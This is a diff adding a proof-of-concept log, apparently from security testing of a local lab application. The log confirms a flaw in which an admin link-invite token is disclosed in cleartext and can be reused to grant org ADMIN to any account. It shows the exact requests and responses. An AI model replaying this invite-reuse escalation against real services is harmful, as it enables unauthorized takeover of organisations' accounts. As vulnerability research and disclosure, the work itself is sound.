@@ -1,0 +1,19 @@
+========================================================================
+VULN-017: Reusable, non-expiring ADMIN link-invite → permanent org takeover
+target: API=http://localhost:21527  dashboard=http://localhost:21526
+========================================================================
+[SETUP] admin session established (user=0419cf7a-0f8b-4797-b953-e8747cc41939)
+[STEP] POST /organization/link-invite {"roleId":1}  (request the ADMIN role)
+[INFO]   create response: roleId=1 isRevoked=False token='D2LNpExPRYAhlp80GL5mq6HEH5bAsKRhyauI-Kmefyg'
+[STEP] GET /organization/link-invite → raw token disclosed: 'D2LNpExPRYAhlp80GL5mq6HEH5bAsKRhyauI-Kmefyg'
+[PROOF] GET /organization/link-invite returns the RAW admin-invite token (cleartext)
+[STEP] fresh account #1 redeems the ADMIN link
+[STEP]   victim1_x_b8389cc5 POST /invite/link/<token>/accept → HTTP 200 {"success":true,"data":{"organizationId":"48bbdff8-2ad5-46a3-a259-2ca3d52677dd","roleId":1,"redirectTo":"/org/cve-hunt-academy"}}
+[INFO]   #1 u_945f600d@cvehunt.local: session_role=1 db_role=1
+[STEP] fresh account #2 redeems the SAME token (reuse)
+[STEP]   victim2_x_57fb3eae POST /invite/link/<token>/accept → HTTP 200 {"success":true,"data":{"organizationId":"48bbdff8-2ad5-46a3-a259-2ca3d52677dd","roleId":1,"redirectTo":"/org/cve-hunt-academy"}}
+[INFO]   #2 u_825d6085@cvehunt.local: session_role=1 db_role=1
+[PROOF] account #1 is now org ADMIN (session & DB role_id=1) via a leaked link, no prior privilege
+[PROOF] account #2 ALSO became ADMIN with the SAME token → invite is reusable / not consumed
+==> VULN-017: CONFIRMED — ADMIN link-invite discloses its raw token and reusably grants org ADMIN to any account
+[OK] confirmed — durable, reusable, cleartext, admin-scoped invite = permanent org takeover
